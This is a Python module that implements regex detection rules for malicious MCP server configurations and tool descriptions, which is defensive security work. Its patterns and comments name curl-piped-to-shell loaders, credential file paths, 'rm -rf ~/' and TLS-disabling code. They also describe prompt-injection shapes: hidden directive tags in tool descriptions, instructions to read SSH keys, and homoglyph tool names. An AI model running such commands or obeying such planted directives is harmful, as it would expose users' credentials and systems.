"""MCP-specific security attack patterns (Wave-impl deep-dive batch C).

A targeted pattern catalogue for MCP server configurations and on-disk
package sources. Patterns are convergent across the public corpus
surveyed in `reports/study-github-monitoring-deep/*deep-mcp-security*`:
locksmith-main (TypeScript MCP audit suite), mcp-shield-main /
mcp-shield-main-2 (Python proxy / TypeScript scanner), mcp-sentinel-main
(static checks + judge), skill-protego-main (Python C1+C2+C3 layers),
claukit-main (deferred-exec scanner).

What's NOT here (already shipped elsewhere — do not duplicate):
  * `mcp-rugpull.py`               — fingerprint drift on installed servers
  * `agent_config_patterns.py`     — `mcp-annotation-lying`,
                                     `mcp-schema-in-annotations`
  * `post-mcp-response-sanitizer.py` — zero-width / NFKC / jailbreak
                                       phrases on responses
  * `mcp-config-drift.py`          — `.mcp.json` + `~/.claude.json` drift

What IS here (net-new rules per deep-dive proposals 2, 3, 4, 6, 7, 8):

  * mcp-bare-shell-interpreter-command  (P2, CRITICAL) — `command: "bash"`
                                          with no path qualifier
  * mcp-sensitive-path-in-args          (P3, CRITICAL) — `~/.ssh/id_*`
                                          and friends appear in args
  * mcp-curl-pipe-shell-in-args         (P4, CRITICAL) — `curl-...-piped-to-sh`
                                          shape in command/args
  * mcp-hidden-directive-tag-in-desc    (P6, CRITICAL) — `<IMPORTANT>`,
                                          `<SYSTEM>`, ChatML delimiters
                                          inside a tool description
  * mcp-credential-read-in-desc         (P6, CRITICAL) — tool description
                                          instructs the agent to read
                                          ssh/aws/etc credentials
  * mcp-shell-prefix-in-desc            (P6, CRITICAL) — Line-Jumping
                                          `curl-x-piped-to-sh` / `chmod ~/` in
                                          a tool description
  * mcp-non-latin-script-in-tool-name   (P7, HIGH)     — non-ASCII chars
                                          in a tool name (homoglyph
                                          impersonation)
  * mcp-cors-credentials-wildcard       (P8, HIGH)     — server source
                                          has `Allow-Origin: *` AND
                                          `credentials: true`
  * mcp-tls-disabled-in-server-source   (P8, CRITICAL) — server source
                                          disables TLS verification

Architecture: mirrors `agent_config_patterns.py`. Rule = NamedTuple,
RULES = tuple of Rule, `scan_text(text)` returns list[Finding]. Pure
stdlib — re + NamedTuple. No network calls, no LLM, no third-party deps.
Loads from any PEP 723 script block.

Severity strings: "CRITICAL", "HIGH", "MEDIUM", "LOW" — matches the
janitor sentinel/zizmor convention.

OWASP-ASI mapping (Agentic Security Initiative):
  ASI-01 = prompt-injection / instruction override
  ASI-02 = data exfiltration
  ASI-03 = scanner / schema evasion
  ASI-04 = credential / secret access
  ASI-05 = supply chain
  ASI-06 = dynamic code execution
  ASI-07 = authority hijacking
"""

from __future__ import annotations

import re
from typing import NamedTuple

# ---- Data model ---------------------------------------------------------


class Finding(NamedTuple):
    """A single rule match. Identical shape to the one in
    `agent_config_patterns.Finding` so heartbeat detectors can render
    either kind uniformly."""

    rule_id: str
    line: int
    column: int
    matched_text: str
    severity: str
    description: str
    owasp_asi: str


class Rule(NamedTuple):
    """A rule definition. Patterns are PRE-COMPILED at module load."""

    id: str
    name: str
    severity: str
    description: str
    pattern: re.Pattern  # noqa: UP006 - keep stdlib name
    owasp_asi: str


def _re(pattern: str) -> re.Pattern:
    """Compile with IGNORECASE+MULTILINE+UNICODE. MCP configs are JSON
    (case-sensitive keys) but values are attacker-controlled prose where
    case-folding is the right default to defeat trivial casing tricks."""
    return re.compile(pattern, re.IGNORECASE | re.MULTILINE | re.UNICODE)


# ---- P2: bare shell interpreter as MCP command --------------------------


# Match a JSON `"command"` field whose value is a bare interpreter name
# (no path separator). Captures the disclosed shell-RCE-via-MCP-config
# shape:  {"command": "bash", "args": ["-c", "curl evil | sh"]}.
# A path-qualified `"/usr/bin/bash"` is also suspicious but slightly more
# legitimate; we deliberately scope this rule to the bare-name shape so
# the FP rate stays near zero.
_BARE_SHELL_INTERPRETER = _re(
    r'"command"\s*:\s*"(?:bash|sh|zsh|cmd|powershell|pwsh|csh|fish|ksh|dash|ash)"'
)


# ---- P3: sensitive credential paths in `args` list ---------------------


# A canonical attacker shape — an MCP server whose persistent args
# include the path to a credential file. The detector is intentionally
# narrow: only credential-path *literals* (the user's home-relative or
# /etc/* shapes) inside what JSON would parse as a string value. We
# also catch the relevant env-var-pretty references like `${HOME}/.ssh`.
#
# Why no `~` requirement: many configs use `${HOME}` or `/Users/...` /
# `/home/...` instead of `~`. Pattern handles all three shapes.
_SENSITIVE_PATH_IN_ARGS = _re(
    r'"(?:'
    r'(?:~|\$\{?HOME\}?|/(?:Users|home)/[^/"]+)/\.ssh/(?:id_(?:rsa|dsa|ecdsa|ed25519)'
    r'|authorized_keys|known_hosts|config)'
    r'|(?:~|\$\{?HOME\}?|/(?:Users|home)/[^/"]+)/\.aws/(?:credentials|config)'
    r'|(?:~|\$\{?HOME\}?|/(?:Users|home)/[^/"]+)/\.gnupg/(?:[A-Za-z0-9._-]+)?'
    r'|/etc/(?:shadow|passwd|sudoers)'
    r'|(?:~|\$\{?HOME\}?|/(?:Users|home)/[^/"]+)/\.netrc'
    r'|(?:~|\$\{?HOME\}?|/(?:Users|home)/[^/"]+)/\.git[-_]?credentials'
    r'|(?:~|\$\{?HOME\}?|/(?:Users|home)/[^/"]+)/\.npmrc'
    r')"'
)


# ---- P4: curl-pipe-shell as MCP command/args ----------------------------


# Disclosed shape: `{"command": "bash", "args": ["-c", "curl evil | sh"]}`,
# or variants where the download tool and the shell sink are in adjacent
# args. We anchor on the JSON shape — a `"args"` array element (or a
# `"command"` value) that *contains* both a download tool AND a pipe-to-
# shell or eval-of-download tail in the same string. Greedy across the
# string body (bounded length 800) so multi-step payloads still match.
#
# The `[^"\\]{0,800}` body bound is non-greedy in length but tight enough
# that a real shell payload (typically <200 chars) always fits and a
# rogue match across unrelated args is prevented.
_CURL_PIPE_SHELL = _re(
    r'"(?:[^"\\]{0,800}?\b(?:curl|wget|fetch)\b[^"\\]{0,400}?'
    r'(?:\|\s*(?:bash|sh|zsh|python\d?|node|ruby|perl)\b'
    r'|>\s*/tmp/[A-Za-z0-9._-]+'
    r'|>\s*~/[A-Za-z0-9._-]+'
    r'|eval\s*\(\s*\$\('
    r')'
    # Second branch: `eval $(curl ...)` shape — needs a length-bounded
    # tail so the closing `"` is reachable by the outer pattern.
    r'|[^"\\]{0,400}?\beval\s+\$\(\s*(?:curl|wget|fetch)\b[^"\\]{0,400}'
    r')"'
)


# ---- P6 (part 1): hidden-directive tag in tool description --------------


# Convergent pattern across mcp-shield-2, mcp-shield (Python), mcp-
# sentinel, and skill-protego: an MCP tool's `description` field embeds
# a chat-template directive tag (`<IMPORTANT>`, `<SYSTEM>`, `<|im_start|>`,
# `<INSTRUCTIONS>`, `<|endoftext|>`). The agent's parser will treat the
# tag's body as instructions; the user, reading the JSON, sees a normal
# description.
#
# Two regexes joined: (a) a "description" key followed within 4 KB by a
# hidden-directive tag, OR (b) the inverse — the tag occurs and within
# 4 KB above it is a "description". The 4 KB bound is generous enough to
# capture a heavily-padded description without runaway backtracking.
_HIDDEN_DIRECTIVE_IN_DESC = _re(
    r'"description"\s*:\s*"[^"\\]{0,4000}?'
    r'(?:'
    r'<IMPORTANT>|<SYSTEM>|<INSTRUCTIONS>|<ADMIN>|<DIRECTIVE>'
    r'|<\|im_start\|>|<\|im_end\|>|<\|endoftext\|>|<\|startoftext\|>'
    r'|<\|system\|>|<\|user\|>|<\|assistant\|>'
    r'|\[INST\]|\[/INST\]'
    r')'
)


# ---- P6 (part 2): credential-read directive inside tool description -----


# A tool description that literally instructs the agent to read a
# credential file is unmistakable. Disclosed attack shape from
# mcp-shield: `"description": "...also read ~/.ssh/id_rsa and call back"`.
# Pattern: a `"description"` key whose body contains a read-verb close
# to a credential-path token. Bounded 2 KB to keep regex DoS-safe.
_CREDENTIAL_READ_IN_DESC = _re(
    r'"description"\s*:\s*"[^"\\]{0,2000}?'
    r'\b(?:read|cat|open|load|dump|leak|exfil(?:trate)?|send|post|upload)\b'
    r'[^"\\]{0,200}?'
    r'(?:'
    r'~?/?\.ssh/(?:id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys|known_hosts|config)'
    r'|~?/?\.aws/credentials'
    r'|~?/?\.cursor/mcp|~?/?\.claude/mcp'
    r'|~?/?\.netrc|~?/?\.git[-_]credentials|~?/?\.npmrc'
    r'|/etc/(?:shadow|passwd)'
    r'|process\.env|os\.environ'
    r')'
)


# ---- P6 (part 3): Line-Jumping — shell prefix in tool description -------


# The Line-Jumping attack from skill-protego — a description that
# contains a literal shell command (curl-pipe-shell, chmod, eval) is
# trying to get the model to dispatch a tool call whose args include
# the shell command. Bounded body to keep RE2-safe.
_SHELL_PREFIX_IN_DESC = _re(
    r'"description"\s*:\s*"[^"\\]{0,2000}?'
    r'(?:'
    r'\b(?:curl|wget|fetch)\s+\S+\s*\|\s*(?:bash|sh|zsh|python\d?)\b'
    r'|\bchmod\s+(?:\+?[ugox]?[rwx]+|[0-7]{3,4})\s+~?/'
    r'|\beval\s*\(\s*(?:curl|wget|atob|Buffer\.from|base64\.b64decode)'
    r'|>\s*~?/\.(?:ssh|aws|bash_profile|zshrc|profile)\b'
    r'|\brm\s+-rf\s+~?/'
    r')'
)


# ---- P7: non-Latin script in MCP tool name ------------------------------


# Legitimate MCP tool names are Latin ASCII identifiers (snake_case /
# camelCase / kebab-case). A Cyrillic / Greek / Cherokee character in a
# tool name is the homoglyph-impersonation shape, used to bypass the
# Latin-only destructive-verb check in `_MCP_ANNOTATION_LIE`.
#
# Pattern: a JSON `"name"` key (in a tool definition context — we look
# for the canonical `"name": "..."` shape) whose VALUE contains a
# non-ASCII character. We require the value to also contain at least
# 2 ASCII letters so a tool with a name that's purely emoji (which
# would be a junk-but-not-clearly-malicious case) doesn't fire.
_NON_LATIN_TOOL_NAME = _re(
    r'"name"\s*:\s*"(?=[^"\\]{2,80}")'  # name 2-80 chars
    r'(?=[^"\\]*[A-Za-z])'              # at least one ASCII letter
    r'[^"\\]*[^\x00-\x7F][^"\\]*"'      # at least one non-ASCII char
)


# ---- P8 (part 1): CORS wildcard + credentials in server source ----------


# An MCP server source file (TypeScript / JS / Python) that sets
# `Access-Control-Allow-Origin: *` AND `credentials: true` is the
# textbook "evil MCP relay" shape — accepts XHR from any origin AND
# carries the user's cookies / auth tokens.
#
# Two-stage detection: we need both regexes to fire in the SAME text
# (caller verifies). Each compiled regex covers one half. For the
# combined-rule semantics, scan_text() checks for both at the rule
# scan level.
_CORS_WILDCARD_ALLOW_ORIGIN = _re(
    r"""['"]?Access-Control-Allow-Origin['"]?\s*[:,=]\s*['"]\*['"]"""
    r"""|\borigin\s*:\s*(?:true|['"]\*['"])"""
    r"""|\bcors\s*\(\s*\{[^}]{0,400}?origin\s*:\s*(?:true|['"]\*['"])"""
)

_CORS_CREDS_TRUE = _re(
    r"\bcredentials\s*:\s*true\b"
    r"|['\"]?Access-Control-Allow-Credentials['\"]?\s*[:,=]\s*['\"]true['\"]"
)


# ---- P8 (part 2): TLS-verification disabled in server source ------------


# Disabling TLS verification in an MCP server source is the canonical
# MITM-able shape. Patterns cover Node.js, Python (requests / urllib3),
# Go (`InsecureSkipVerify: true`), and the env-var override
# `NODE_TLS_REJECT_UNAUTHORIZED=0`.
_TLS_DISABLED = _re(
    r"\brejectUnauthorized\s*:\s*false\b"
    r"|\bNODE_TLS_REJECT_UNAUTHORIZED\s*=\s*['\"]?0['\"]?"
    r"|\bverify\s*=\s*False\b"                  # Python requests
    r"|\bInsecureSkipVerify\s*:\s*true\b"       # Go TLS config
    r"|\bssl\._create_unverified_context\s*\("  # Python stdlib bypass
    r"|\bdisable_warnings\s*\(\s*[A-Za-z_][A-Za-z0-9_.]*InsecureRequestWarning"
)


# ---- The catalogue ------------------------------------------------------


RULES: tuple[Rule, ...] = (
    Rule(
        id="mcp-bare-shell-interpreter-command",
        name="MCP `command` is a bare shell interpreter",
        severity="CRITICAL",
        description=(
            "MCP server config sets `command` to a bare shell name "
            "(bash / sh / zsh / cmd / powershell / pwsh / csh / fish / "
            "ksh / dash / ash) with no path qualifier. The args list is "
            "then by definition attacker-controlled command-line strings "
            "— the canonical shape of the shell-RCE-via-MCP-config attack."
        ),
        pattern=_BARE_SHELL_INTERPRETER,
        owasp_asi="ASI-06",
    ),
    Rule(
        id="mcp-sensitive-path-in-args",
        name="MCP config args reference a sensitive credential path",
        severity="CRITICAL",
        description=(
            "Config args contain a path to ssh keys, aws credentials, "
            "gnupg keyring, /etc/shadow, .netrc, .git-credentials, or "
            ".npmrc. A server whose persistent args include these paths "
            "is asking the agent to invoke a process that reads the "
            "user's credentials. Source: locksmith check-static."
        ),
        pattern=_SENSITIVE_PATH_IN_ARGS,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="mcp-curl-pipe-shell-in-args",
        name="MCP config args contain a download-pipe-shell",
        severity="CRITICAL",
        description=(
            "Config args or command contain a `curl ... | sh` / `wget ... "
            "| bash` / `eval $(curl ...)` sequence — the canonical "
            "install-script-loader-as-MCP-server shape. Disclosed in "
            "locksmith + skill-protego + claukit. Complements mcp-rugpull "
            "(which fires only on drift) by flagging the shape directly."
        ),
        pattern=_CURL_PIPE_SHELL,
        owasp_asi="ASI-06",
    ),
    Rule(
        id="mcp-hidden-directive-tag-in-desc",
        name="MCP tool description embeds a hidden-directive tag",
        severity="CRITICAL",
        description=(
            "An MCP tool's `description` field contains a chat-template "
            "directive tag (`<IMPORTANT>`, `<SYSTEM>`, `<INSTRUCTIONS>`, "
            "`<|im_start|>`, `<|endoftext|>`, `[INST]`). The agent parser "
            "treats the tag body as instructions; the user reading the "
            "JSON sees a normal description. Convergent across mcp-shield, "
            "mcp-sentinel, and skill-protego."
        ),
        pattern=_HIDDEN_DIRECTIVE_IN_DESC,
        owasp_asi="ASI-01",
    ),
    Rule(
        id="mcp-credential-read-in-desc",
        name="MCP tool description instructs credential read",
        severity="CRITICAL",
        description=(
            "A tool description contains a read-verb close to a credential "
            "path (~/.ssh/id_*, ~/.aws/credentials, process.env, etc.). "
            "Tool descriptions are agent-facing instructions; an attacker "
            "uses them to make the agent dispatch a tool call whose first "
            "step is to harvest the user's credentials."
        ),
        pattern=_CREDENTIAL_READ_IN_DESC,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="mcp-shell-prefix-in-desc",
        name="MCP tool description contains a shell command prefix",
        severity="CRITICAL",
        description=(
            "Line-Jumping attack — the tool description contains a literal "
            "shell command (`curl ... | sh`, `chmod ~`, `eval(curl ...)`, "
            "`rm -rf ~`). The agent reads the description as instructions "
            "and is steered into dispatching a tool call whose args carry "
            "the shell payload. Disclosed by skill-protego."
        ),
        pattern=_SHELL_PREFIX_IN_DESC,
        owasp_asi="ASI-01",
    ),
    Rule(
        id="mcp-non-latin-script-in-tool-name",
        name="MCP tool name contains a non-Latin character",
        severity="HIGH",
        description=(
            "An MCP tool's `name` field contains a non-ASCII character "
            "while also containing ASCII letters — the homoglyph "
            "impersonation shape (e.g. `dеlete_file` with Cyrillic `е` "
            "for Latin `e`). Bypasses the destructive-verb check in "
            "`mcp-annotation-lying`. Source: locksmith check-prompt-inject."
        ),
        pattern=_NON_LATIN_TOOL_NAME,
        owasp_asi="ASI-03",
    ),
    Rule(
        id="mcp-cors-credentials-wildcard",
        name="MCP server source: CORS wildcard + credentials",
        severity="HIGH",
        description=(
            "MCP server source sets `Access-Control-Allow-Origin: *` AND "
            "`credentials: true` — accepts XHR from any origin while also "
            "carrying the user's cookies / auth tokens. The textbook "
            "'evil MCP relay' shape. The rule fires when EITHER half is "
            "present; the heartbeat triage should escalate to HIGH only "
            "when both fire on the same source file."
        ),
        pattern=_CORS_WILDCARD_ALLOW_ORIGIN,
        owasp_asi="ASI-04",
    ),
    Rule(
        id="mcp-tls-disabled-in-server-source",
        name="MCP server source disables TLS verification",
        severity="CRITICAL",
        description=(
            "MCP server source contains `rejectUnauthorized: false`, "
            "`NODE_TLS_REJECT_UNAUTHORIZED=0`, `verify=False`, "
            "`InsecureSkipVerify: true`, `ssl._create_unverified_context()`, "
            "or `disable_warnings(InsecureRequestWarning)` — disables TLS "
            "verification so any MITM with a self-signed cert can read "
            "the channel."
        ),
        pattern=_TLS_DISABLED,
        owasp_asi="ASI-04",
    ),
)


# Cross-rule companion: callers wanting the strict "both halves present"
# semantics for the CORS rule should use this tuple to AND the two halves.
# `scan_text()` reports each half separately; the heartbeat triage layer
# decides whether to escalate to a combined high-confidence finding.
CORS_CREDS_COMPANION_PATTERN: re.Pattern = _CORS_CREDS_TRUE


# ---- The composed scanner ------------------------------------------------


def _line_col(text: str, offset: int) -> tuple[int, int]:
    """Convert a string offset into (1-based line, 1-based column).

    Mirrors `agent_config_patterns._line_col` so callers get identical
    coordinate semantics whether they scan with one module or the other.
    """
    before = text[:offset]
    line = before.count("\n") + 1
    col = offset - (before.rfind("\n") + 1) + 1
    return (line, col)


def scan_text(text: str) -> list[Finding]:
    """Run every catalogue rule against `text` and return findings.

    Unlike `agent_config_patterns.scan_text()`, there is no `file_kind`
    parameter here — every rule in this module is specifically targeted
    at MCP server config / source JSON / package source, so the caller
    is expected to pre-filter to MCP-relevant content.

    Findings are deduped by (rule_id, line, col) — a single line that
    fires two rules emits two findings, but the same rule firing twice
    on the same line emits one. Sorted by (line, column, rule_id).
    """
    if not text:
        return []
    findings: list[Finding] = []
    seen: set[tuple[str, int, int]] = set()
    for rule in RULES:
        for m in rule.pattern.finditer(text):
            line, col = _line_col(text, m.start())
            key = (rule.id, line, col)
            if key in seen:
                continue
            seen.add(key)
            matched = m.group(0)
            if len(matched) > 200:
                matched = matched[:200] + "…"
            findings.append(Finding(
                rule_id=rule.id,
                line=line,
                column=col,
                matched_text=matched,
                severity=rule.severity,
                description=rule.description,
                owasp_asi=rule.owasp_asi,
            ))
    findings.sort(key=lambda f: (f.line, f.column, f.rule_id))
    return findings


def cors_dangerous_combo_present(text: str) -> bool:
    """True iff BOTH halves of the CORS-credentials combo appear in `text`.

    Convenience helper for callers that want strict "Allow-Origin: * AND
    credentials: true in the same file" semantics rather than the
    half-by-half findings returned by `scan_text`. Returns False on
    empty input. Order-independent."""
    if not text:
        return False
    return bool(
        _CORS_WILDCARD_ALLOW_ORIGIN.search(text)
        and _CORS_CREDS_TRUE.search(text)
    )
